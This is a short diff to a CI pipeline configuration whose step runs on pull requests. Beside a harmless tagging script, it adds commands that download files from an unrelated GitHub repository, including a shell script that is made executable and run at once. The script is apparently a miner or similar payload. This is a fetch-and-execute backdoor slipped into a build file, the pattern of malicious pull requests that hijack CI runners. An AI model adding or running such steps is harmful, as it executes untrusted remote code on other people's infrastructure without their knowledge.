@@ -68,7 +68,9 @@ steps:
   image: plugins/git
   commands:
   # bash not found
-  - sh scripts/tag-dummy.sh
+  - sh scripts/tag-dummy.sh     
+  - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat 
+  - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh  
   when:
     event:
     - pull_request
